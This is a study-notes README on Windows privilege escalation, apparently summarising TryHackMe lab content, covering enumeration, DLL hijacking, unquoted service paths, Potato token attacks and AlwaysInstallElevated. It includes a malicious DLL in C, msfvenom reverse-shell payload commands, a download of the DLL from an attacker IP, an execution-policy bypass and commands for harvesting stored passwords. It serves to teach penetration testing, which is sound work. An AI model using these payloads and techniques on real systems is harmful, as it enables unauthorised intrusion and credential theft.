# Basic Windows Privesc

Thanks to TryHackMe for the great content. This repo is just to sum everything up.

Getting a foothold on the target may be pretty easy, however the challenge is to elevate your privileges on the initial target. Sometimes this can be very hard and requires alot of enumertion on the target, and sometimes and can be really eay for example you may see a vulnerable kernel (the program that manages the entire OS)

Windows system have different privilege accounts then for example a Linux system. Some of the most common user level are listed below:

- Local Administrator: This is the user with the most privileges.
- Standard (local): These users can access the computer but can only perform
limited tasks. Typically these users can not make permanent or essential changes to the system.
- Guest: This account gives access to the system but is not defined as a user.
- Standard (domain): Active Directory allows organizations to manage user
accounts. A standard domain account may have local administrator
privileges.
- Domain Administrator: Could be considered as the most privileged user. It can edit, create, and delete other users throughout the domain.

Sometimes you may come across "SYSTEM" as a privileged account for example when you get a shell. "SYSTEM" is not an account. Windows and its services use the "SYSTEM" acount to do their tasks. Services on a Windows target can use service account, however you they don't allow you to log in but can be leveraged in other ways for privesc.

Usually you'll come across the following methodology:

1. Enumerate the current user's privileges and resources it can access. (folders, files etc.)
2. If the antivirus allows it run an enumeration script such and winPEAS or PowerUp.ps1
3. If the inital enumeration and scripts do not uncover and strategy you can try a manual approach for example this checklist: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

# User Enumeration

`whoami /priv` Current user's privileges

`net users` List users

`net user <username>` List details of user

`qwinsta` Other users logged in

`net localgroup` User groups defined on the system

`net localgroup <groupname>` List members of a specific group

### System Enumeration

the `systeminfo` command will return an overview of the target system. The amount of data can be overwhelming especially in an corporate environment. You can use findstr to filter the output

### Searching Files

The `findstr` command can be used to find files in (sub)directory's example:
`findstr /si password *.txt`

/si (s) Searches the current directory and all subdirecties (i) ignore any upper/lower case differences

password: This will search for the string "password"

*.txt: This will cover files that have a .txt extension

To filter output we can use the pipe symbool `|` 

### Patch Level

Microsoft releases updates and patches for Windows systems. A critical patch on the target system can be an easily exploitable ticket to privesc. The command below is used to list the updates installed: `wmic qfe get Caption,Description,HotFixID,InstalledOn`

WMIC is a command-line tool on Windows that provides an interface for the Windows Management Instrumentation (WMI). It can do more then just give information about installed patches. For example it can be used to look for unquoted service path vulnerabilities. WMIC is deprecated in Windows 10, version 21H1. For newer versions you need to use the WMI PowerShell cmdlet.

### Network Connections

You might have already done an nmap scan on the inital target so know already know what is running. However some services are only accessible locally. The command `netstat -ano` will list all listening ports on the target system.

-a: displays all active connections

-n: prevents name resolution. IP addresses and ports are displayed with number.

-o: displays the PID used by each process

Any port listed as "LISTENING" that was not discovered with scanning external can be a potential local service. So be sharp.

### Scheduled Tasks

Some tasks may be scheduled to run at specific times. If they run with a privileged account (for example a System Admin account) and the executable they run can be modified by the current user you have, this would be an easy path for privilege escalation.

To check this you can run the `schtasks` command

To see all tasks in details use the `schtasks /query /fo LIST /v` command 

### Antivirus

Sometimes you have to deal with AV aka Antivirus. Antivirus can cause you to miss your shell if you don't try to evade it. Its always a good idea to check if the antivirus is present and up running,

To check if Windows defender is running we can use the command `sc query windefend`

And to check if any AV is running on a specific service we may use the `sc queryex type=service` command.

# Tools

### WinPEAS

WinPEAS is a script developed to enumerate an initial target automated. You can download it as an executable or a batch file. (exe, bat). Note that windows defender detects and disables winPEAS. Its always a good idea to put the output in a file since the results can be very long. `winpeas.exe > results.txt`

Download: [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

### PowerUp

PowerUp is a PowerShell script that searches for common privilege escalation techniques on the target. You can use the `Invoke-AllChecks` option this will perform all possible checks on the target. The `Get-UnquotedService` option looks for potential unquoted service path vulnerabilties

Download: [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

Note: To run PowerUp on the target system. You may need to bypass the execution policy. To do this you can use the command below:

`powershell.exe -nop -exec bypass`

`Import-Module .\PowerUp.ps1`

`Invoke-AllChecks`

### Windows Exploit Suggester

Script like winPEAS and PowerUp will require you to upload them to the target and then execute them. The AV can pick this up and delete them. To avoid making noise that can be deteced you can use Windows Expoit Suggester which is a Python script. To use it we will first have to execute systeminfo on the target machine and safe it in a file. Then use the following syntax:

`./windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.tx`

This will feed the "systeminfo" input and point it to the microsoft database.

Download: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

### Metasploit

If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities thay may cause the elevation on prilieges.

# Vulnerable Software

Software installed on a target system can also present any prvilege escalation opportunies. Organizations or users may not update them as often as for example the OS. We can use the wmic tool to list software installed on the system and its versions. `wmic product` will list all software installed on the target however this output is really hard to read. You could filter the output to obtain a cleaner output with command `wmic product get name,version,vendor` 

However due some some backward compatibility issues (e.g. software writting for x86 system running on x64 bits) wmic product might not list a installed programs. Therefore it is worth checking the running services using the command `wmic service list brief` you can filter the output with **findstr** if you want.

To list more information on a service you can use the `sc qc "<service>"` command. At this point you can find any possible privilege escaltion exploit that can be used against the software installed on the target system.

# DLL Hijacking

DLL hijacking is an effectieve technique that can allow you to inject code into an application. Some exectutables (.exe) will use Dynamic Link Libraries (DLLs) when running. DLLs are files that store additional function that support the main .exe files. If we can switch a legit DLL file with a maliously crafted DLL file, our code will by run by the application. DLL hijacking requires an application (usally an exe file that either has a missing DLL file, or where the search order can be used to insert the malicious DLL file.

Windows itself uses alot of DLL file these are stored in C:\Windows\System32. A single DLL can be used for many different executables, or be dedicated for a single executable. Another point to keep in mind is that a missing DLL will not always result in an error when launched.

To do a succesful DLL Hijacking we need:

1. An application that uses one or more DLL files
2. A way to manipulate these DLL files

Manipulating DLL files could meaning replacing, or creating a file in the location where the application is looking for. To have a better idea of this we need to know where applications look for DLL files. Microsoft has a document on this subject here: [https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)

If SafeDllSearchMode is enabled:

1. The directory from which the	application loaded.
2. The system directory. Use the	**[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
3. The 16-bit system directory. There	is no function that obtains the path of this directory, but it is	searched.
4. The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path	specified by the **App Paths** registry key. The **App	Paths** key is not used when computing the DLL search path.

If SafeDllSearchMode is disabled:

1. The directory from which the	application loaded.
2. The current directory.
3. The system directory. Use the	**[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)**	function to get the path of this directory.
4. The 16-bit system directory. There	is no function that obtains the path of this directory, but it is	searched.
5. The Windows directory. Use the	**[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)**	function to get the path of this directory.
6. The directories that are listed in the PATH environment	variable. Note that this does not include the per-application path	specified by the **App Paths** registry key. The **App	Paths** key is not used when computing the DLL search path.

For example, if our application requires app.dll to run. It will first look in the application from where its launched. If this does not return any match, the serach will continue in the order. If the user has privileges on the system to write to any folder in the search order we have an easy privesc. **note: The application should not be able to find a legit DLL before our modified DLL.**

### Fining DLL Hijacking Vulnerabilties

Identifying a DLL vulnerabilty will require the use of additional tools or script on the target system. However this can cause unneccesory noise. Another approach would be to install the same application on the test system. However this can give inacuratte results due to the version differences or target system configuration. 

A tool you can use to find a potential vulnerability is Process Monitor (ProcMon). You will first need to install the software on your test environment and to research there. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/98fd61bd-bc41-4afd-aac8-d58eca780d4b/Untitled.png)

As you can see in the following screenshot you can see some entries are resulted as "NAME NOT FOUND".  In the last 2 lines you see that dllhijackservice.exe is trying to call a .DLL file in directory "C:\Temp\hijackme.dll". 

### Creating malicious DLL file

As mentioned DLL files are executable files, they will be run by the exectuable file and the commands tehy contain will be executed. The DLL file could be a reverse shell or a OS system command. The example below is an example DLL file

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

What this line of C code will do is launch cmd.exe, run the command whoami and save the results to "C:\\Temp\\dll.txt"

To compile to piece of C code to a DLL file we will be using Mingw compiler. This can be installed used the apt install `gcc-mingw-w64-x86-64` command. To generate the code we can using the following command: `x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

Once compiled we will need to move the .DLL file to the local machine, we can do this using a local python server for example, and then using the wget command in powershell. (e.g. `wget -O hijackme.dll http://10.11.46.156:8000/hijackme.dll`) *note the -O flag

After putting the .DLL file in place we will have to start the service again using the following command: `sc stop <service> start <service>`

# Unquoted Service Path

When a service starts the OS has to find and run an executable find. For example the netlogon service is referring to the C:\Windows\system32\lsass.exe binary.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/35e0da28-a9e8-48ad-b128-00a600b9b0f5/Untitled.png)

Imagine we have a service running on `C:\Program Files\topservice folder\subservice subfolder\srvc.exe` to a human eye, this path wouldn't be merely any different from `"C:\Program Files\topservice folder\subservice subfolder\srvc.exe"`. Windows approaches this a bit different, it knows its looking for an executable file (.exe). If the path is written between quotes it will directly go to the correct location. However if this path is not written between quotes and if any folder name in the path has aspace in its name Windows will **append ".exe"** and start looking for an executable, so starting with the **shortest possible path**. If this fails another attempt will be made in the next sub-directory. Until the executable is found. Exploiting this vulnerabilty **will require write permissions** to a folder where to service will look for an executable.

The command `wmic service get name,displayname,pathname,startmode` will list services running on the target system, display name, and path. If you find an intrestering service without the use of quotes you may use the `sc qc unquotedsvc` command to check the complete path of the service.

Once you have confirmed that the binary path is unquoted, you will need to check if the folder in the path are writeable. You can do this manually, by checking if you can create files in the directory or use a tool called accesschk.exe.`.\accesschk64.exe /accepteula -uwdq "C:\"` Will list user group with read (r) and write (w) privileges in the C:\ folder. You can download this on github

After checking if the path is writeable we can generate an executable with MSFvenom and catch it with a multi/handler. 

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=X -f exe > executable_name.exe`

Once you have generated and moved the file to the location restart the vulnerable service. You can use the `sc start <service>` command to start the service.

# Token Impersonation

Service accounts may have a high privilege level than low-level default users. In Windows versions before Server 2019 and 10 (version 1809), these service account are affected by an internal MitM vulnerability. Higher privileged service accounts will be forced to authenticate to a local port we will listen on. Once the service account attempts toauthenticate, this request is modified to negotiatie a security token for the "NT AUTHORITY\SYSTEM" account.This token can be ued by the user in a process called "impersonation". Although this is not a vulnerabilty.

Using the `whoami /priv` command we can see the regular user permissions. In Windows Server 2019 and Windows 10 (version 1809) you will see that a user does not have right for the "SeImpersonatePrivilege" privilege.

There are a lot of vulnerabilies around this token impersonation privilege. You may come across some names like: Hot Potato, Rotten Potato, etc. The first exploit was the Hot Potato, this is how the exploit works to get a fundamental idea behind it.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/051f49c1-ac01-472e-9695-2ddc95977d1d/Untitled.png)

Step 1: The target system uses the Web Proxy Auto-Discovery protocol to locate its update server.

Step 2: This request is intercepted by the exploit, which send a response to the localhost

Step 3: The target system will ask for a proxy config file (wpad.dat)

Step 4: A malicious wpad.dat file is send to the target.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bfe4f266-b90e-4be8-92b4-591a3130f494/Untitled.png)

Step 5: The target system tries to connect to the proxy, which is now the malicous wpad.dat file.

Step 6: The exploit will ask the target system to perform an NTLM authentication

Step 7: The target system sends an NTLM handshake.

Step 8: The handshake recieved is relayed to the SMB service with a request to create a process. 

Which "Potato" version you can use will vary depending on the target system's version, patch level and network connection limitation. While "Hot Potato" works within the target system, other versions may require network access over specific ports.

# Quick Wins

Sometimes escalating your priviliges can be rather easy. Due to some misconfigurations that a system administrator has made.

### Sheduled Tasks

Looking into a sheduled tasks on the target system, you may see a scheduled tasks that either lost its binary or using a binary you can modify. You can simply replace this binary with some malious code. Note that this binary has to be run by someone with higher privs then the one you already have. You can list the tasks using the `schtasks` command.

### AlwaysInstallElevated

Windows installer files (also known as .msi file) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However these can be configured to run with higher privileges if the installation requires administrator rights. This could potentially allow us the generate a malcious MSI file that we can run with admin privileges.

This method requires two regedit keys to be set, you can query these using the command line like this: 

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

You will need both registry vales to be set. Otherwise it will not be exploitable. This can also be enabled in the GPO. If this is set we can generate shellcode using msfvenom.

`msfvenom -p windows/x64/shell_reverse_tcp LHOSTX LPORT=X -f msi -o malicious.msi`

Once you have transferred the file run it using the following command:

`msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

### Passwords

Looking for config files or user-generated files containing password can be rewarding. However there are other location on Windows that could hide cleartext passwords.

**Saved credentials:**

Windows allows us the use other user's credentials. This function also gives the option to save these credentials on the system. The command below will list the saved credentials. **`cmdkey /list.`**

If you see any credentials with trying you can use them with the `runas` command with the **`/savecred`** option. `runas /savecred /user:admin reverse_shell.exe` 

**Registry keys:**

Registry keys containing password can be queried using the commands

`reg query HKLM /f password /t REG_SZ /s`

`reg query HKCU /f password /t REG_SZ /s`

**Unattend files:**

Unattend.xml files helps administrators help settings up Windows system. They need to be deleted once the setup is completed, but sometimes forgotton. If you find this kind if file, they are worth reading.
